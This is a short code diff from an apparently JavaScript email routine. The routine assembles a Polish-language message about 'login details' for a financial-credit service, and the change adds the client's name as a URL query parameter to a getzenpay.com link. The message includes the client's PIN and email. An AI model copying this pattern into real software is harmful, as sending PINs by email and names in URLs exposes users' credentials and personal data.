@@ -1254,7 +1254,7 @@
                         const name = v.nom || 'Klient';
                         const email = v.email || '---';
                         const pin = v.pin || '---';
-                        const link = 'https://polska.getzenpay.com/';
+                        const link = 'https://polska.getzenpay.com/?nom=' + encodeURIComponent(name);
 
                         const sujet = `${suffixe} ${name} - Twoje dane logowania KREDYT FINANSOWY`;
 
